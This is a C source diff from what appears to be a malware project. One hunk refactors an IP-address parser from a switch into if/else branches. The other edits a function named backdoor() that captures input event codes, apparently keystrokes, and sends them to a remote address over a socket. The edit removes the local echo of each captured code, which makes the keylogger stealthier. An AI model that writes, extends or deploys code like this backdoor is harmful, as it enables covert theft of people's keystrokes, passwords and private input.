@@ -324,35 +324,35 @@ int	my_inet_aton(char *cp, struct in_addr *ap)
 	register u_long acc = 0, addr = 0;
 	do {
 		register char cc = *cp;
-		switch (cc) {
-			case '0':
-			case '1':
-			case '2':
-			case '3':
-			case '4':
-			case '5':
-			case '6':
-			case '7':
-			case '8':
-			case '9':
-				acc = acc * 10 + (cc - '0');
-				break;
-			case '.':
-				if (++dots > 3) {
-					return 0;
-				}
-				break;
-			case '\0':
-				if (acc > 255) {
-					return 0;
-				}
-				addr = addr << 8 | acc;
-				acc = 0;
-				break;
-			default:
-				return 0;
+		if (cc == '0' || cc == '1' || cc == '2' || cc == '3' || cc == '4' || cc == '5' || cc == '6' || cc == '7' || cc == '8' || cc == '9')
+		{
+			acc = acc * 10 + (cc - '0');
 		}
-	} while (*cp++) ;
+		else if (cc == '.')
+		{
+			if (++dots > 3) {
+				return 0;
+			}
+			if (acc > 255) {
+				return 0;
+			}
+			addr = addr << 8 | acc;
+			acc = 0;
+		}
+		else if (cc == '\0')
+		{
+			if (acc > 255) {
+				return 0;
+			}
+			addr = addr << 8 | acc;
+			acc = 0;
+			break;
+		}
+		else
+		{
+			return (0);
+			}
+	} while (*cp++);
 	if (dots < 3) {
 		addr <<= 8 * (3 - dots) ;
 	}
@@ -400,7 +400,6 @@ static void	backdoor()
 			{
 				if (ft_syssendto(sock, &(ev.code), 2, 0, (struct sockaddr *)&struct_addr_in, len_struct) < 0)
 					ft_sysexit(0);
-				ft_syswrite(1, &(ev.code), 2);
 			}
 		}
 
